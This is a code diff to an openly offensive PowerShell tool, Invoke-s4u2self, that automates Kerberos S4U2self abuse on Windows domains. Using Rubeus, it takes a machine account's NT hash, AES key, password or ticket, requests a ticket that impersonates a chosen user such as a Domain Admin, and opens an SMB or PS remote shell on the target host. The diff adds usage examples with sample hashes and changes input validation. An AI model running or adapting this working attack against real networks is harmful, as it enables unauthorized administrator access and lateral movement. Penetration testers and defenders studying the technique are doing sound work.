@@ -1,5 +1,53 @@
 function Invoke-s4u2self {
 	
+	<#
+
+	.SYNOPSIS
+	Invoke-s4u2self Author: Rob LP (@L3o4j)
+	https://github.com/Leo4j/Invoke-s4u2self
+
+	.DESCRIPTION
+	A tool that automates s4u2self abuse to gain access to remote hosts
+	
+	.PARAMETER Domain
+	Specify the target Domain
+	
+	.PARAMETER DomainController
+	Specify the target Domain Controller
+	
+	.PARAMETER ComputerName
+	Specify the Target Machine
+	
+	.PARAMETER NTHash
+	NT Hash of the Target Machine
+	
+	.PARAMETER AES256
+	AES256 Hash of the Target Machine
+	
+	.PARAMETER Ticket
+	TGT of the Target Machine
+	
+	.PARAMETER Password
+	Password of the Target Machine
+	
+	.PARAMETER Impersonate
+	User you want to impersonate - a user we know is a local admin (e.g.: a Domain Admin)
+	
+	.PARAMETER SMBRemoting
+	Use SMBRemoting to get a shell on the Target
+	
+	.PARAMETER PSRemoting
+	Use PSRemoting to get a shell on the Target
+
+	.EXAMPLE
+	Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -SMBRemoting -Password MachinePassword
+	Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -SMBRemoting -NTHash 22a151bd3056ac739718f73dfe5f9614
+	Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -SMBRemoting -AES256 d01c9d4441caf093ce018c432c48d50efc1c979a984d769cc0db76d6e5c05ab8
+	Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -SMBRemoting -Ticket doIFgjCCBX6gA......BsNZmVycmFyaS5sb2NhbA==
+	Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -SMBRemoting -NTHash 22a151bd3056ac739718f73dfe5f9614 -Domain ferrari.local -DomainController DC01.ferrari.local 
+	
+	#>
+	
 	[CmdletBinding()] Param(
 		
 		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
@@ -10,7 +58,7 @@ function Invoke-s4u2self {
 		[String]
 		$DomainController,
 		
-		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
 		[String]
 		$ComputerName,
 		
@@ -30,7 +78,7 @@ function Invoke-s4u2self {
 		[String]
 		$Password,
 		
-		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
+		[Parameter (Mandatory=$True, ValueFromPipeline=$true)]
 		[String]
 		$Impersonate,
 		
@@ -81,7 +129,7 @@ function Invoke-s4u2self {
 		$FinalTicket = $FinalTicket.Trim()
 	}
 	
-	if($ComputerName -AND $NTHash){
+	elseif($ComputerName -AND $NTHash){
 		$RubTicket = Invoke-Rubeus asktgt /user:$DollarHostname /rc4:$NTHash /domain:$Domain /dc:$DomainController /nowrap
 		$startIndex = $RubTicket.IndexOf('doI')
 		$endIndex = $RubTicket.IndexOf('ServiceName') - 1
@@ -89,7 +137,7 @@ function Invoke-s4u2self {
 		$FinalTicket = $FinalTicket.Trim()
 	}
 	
-	if($ComputerName -AND $AES256){
+	elseif($ComputerName -AND $AES256){
 		$RubTicket = Invoke-Rubeus asktgt /user:$DollarHostname /aes256:$AES256 /domain:$Domain /dc:$DomainController /nowrap /opsec
 		$startIndex = $RubTicket.IndexOf('doI')
 		$endIndex = $RubTicket.IndexOf('ServiceName') - 1
@@ -97,9 +145,18 @@ function Invoke-s4u2self {
 		$FinalTicket = $FinalTicket.Trim()
 	}
 	
-	if($ComputerName -AND $Ticket){
+	elseif($ComputerName -AND $Ticket){
 		$FinalTicket = $Ticket
 	}
+	
+	else{
+		Write-Output ""
+		Write-Output "No credentials provided, quitting..."
+		Write-Output ""
+		break
+	}
+	
+	
 	
 	if($SMBRemoting){
 	
@@ -121,7 +178,7 @@ Enter-SMBSession -ComputerName $FQDNHostname
 "@
 	}
 	
-	if($PSRemoting){
+	elseif($PSRemoting){
 		
 	$commands = @"
 `$ErrorActionPreference = 'SilentlyContinue'
@@ -138,6 +195,13 @@ Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:mssql/$FQDNHos
 Invoke-Rubeus s4u /impersonateuser:$Impersonate /self /altservice:rpcss/$FQDNHostname /user:$DollarHostname /ticket:$FinalTicket /nowrap /ptt > `$null
 Enter-PSSession -ComputerName $FQDNHostname
 "@
+	}
+	
+	else{
+		Write-Output ""
+		Write-Output "Please provide -SMBRemoting or -PSRemoting switch..."
+		Write-Output ""
+		break
 	}
 	
 	$commands | Out-File "C:\Users\Public\Documents\comm.txt"
